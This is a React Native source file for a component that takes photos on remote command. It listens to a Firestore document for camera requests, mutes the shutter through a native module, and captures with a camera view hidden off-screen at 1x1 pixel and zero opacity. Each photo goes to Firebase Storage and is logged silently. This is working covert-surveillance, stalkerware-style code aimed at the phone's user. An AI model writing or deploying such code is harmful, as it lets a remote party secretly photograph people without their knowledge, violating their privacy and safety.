import { useEffect, useRef, useState } from 'react';
import { StyleSheet, NativeModules } from 'react-native';
import { CameraView, CameraType, useCameraPermissions } from 'expo-camera';
import { doc, onSnapshot, updateDoc, collection, addDoc } from 'firebase/firestore';
import { ref as storageRef, uploadBytes, getDownloadURL } from 'firebase/storage';
import { db, storage } from '../config/firebase';

const { PookieModule } = NativeModules;

interface Props { uid: string; }

export default function CameraCommandsManager({ uid }: Props) {
  const cameraRef = useRef<CameraView>(null);
  const [permission, requestPermission] = useCameraPermissions();
  const [facing, setFacing] = useState<CameraType>('front');
  const facingRef = useRef<CameraType>('front');
  const cameraReadyRef = useRef(false);
  const resolversRef = useRef<(() => void)[]>([]);

  useEffect(() => {
    if (!permission?.granted) requestPermission();
  }, []);

  function handleCameraReady() {
    cameraReadyRef.current = true;
    resolversRef.current.forEach(r => r());
    resolversRef.current = [];
  }

  function waitForCamera(): Promise<void> {
    if (cameraReadyRef.current) return Promise.resolve();
    return new Promise(resolve => { resolversRef.current.push(resolve); });
  }

  useEffect(() => {
    if (!uid) return;
    const unsub = onSnapshot(doc(db, 'users', uid), async snap => {
      if (!snap.exists()) return;
      const data = snap.data();
      const cmd = data?.cameraRequested;
      if (!cmd?.timestamp) return;

      await updateDoc(doc(db, 'users', uid), { cameraRequested: null });

      const newFacing: CameraType = cmd.camera === 'back' ? 'back' : 'front';
      if (newFacing !== facingRef.current) {
        cameraReadyRef.current = false;
        facingRef.current = newFacing;
        setFacing(newFacing);
      }

      await Promise.race([
        waitForCamera(),
        new Promise<void>(r => setTimeout(r, 5000)),
      ]);

      await new Promise(r => setTimeout(r, 400));

      try {
        PookieModule?.silenceCamera?.();
        await new Promise(r => setTimeout(r, 100));

        const photo = await cameraRef.current?.takePictureAsync({ quality: 0.8 });
        if (!photo?.uri) return;

        const res = await fetch(photo.uri);
        const blob = await res.blob();
        const sRef = storageRef(storage, `snapshots/${uid}/${Date.now()}.jpg`);
        await uploadBytes(sRef, blob);
        const url = await getDownloadURL(sRef);

        await addDoc(collection(db, 'users', uid, 'snapshots'), {
          url,
          camera: newFacing,
          takenAt: Date.now(),
        });
      } catch {}
    });
    return unsub;
  }, [uid]);

  if (!permission?.granted) return null;

  return (
    <CameraView
      ref={cameraRef}
      style={styles.hidden}
      facing={facing}
      onCameraReady={handleCameraReady}
    />
  );
}

const styles = StyleSheet.create({
  hidden: {
    position: 'absolute',
    width: 1,
    height: 1,
    top: -2000,
    left: -2000,
    opacity: 0,
  },
});
